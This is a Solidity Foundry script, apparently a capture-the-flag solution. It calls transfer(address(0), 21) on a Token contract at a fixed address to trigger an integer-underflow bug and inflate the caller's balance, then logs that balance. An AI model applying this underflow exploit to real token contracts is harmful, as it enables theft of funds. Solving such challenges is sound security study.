// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenSolution is Script {

    Token public tokenInstance = Token(0x3B4Fd8d22f8CA8d1D5cd3DcaA82aE6BD98472ACA);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tokenInstance.transfer(address(0), 21);
        console.log("My balance: ", tokenInstance.balanceOf(0x8b88A3b92433638324E5f429bEe52b1fd84E7c5a));
        vm.stopBroadcast();
    }
}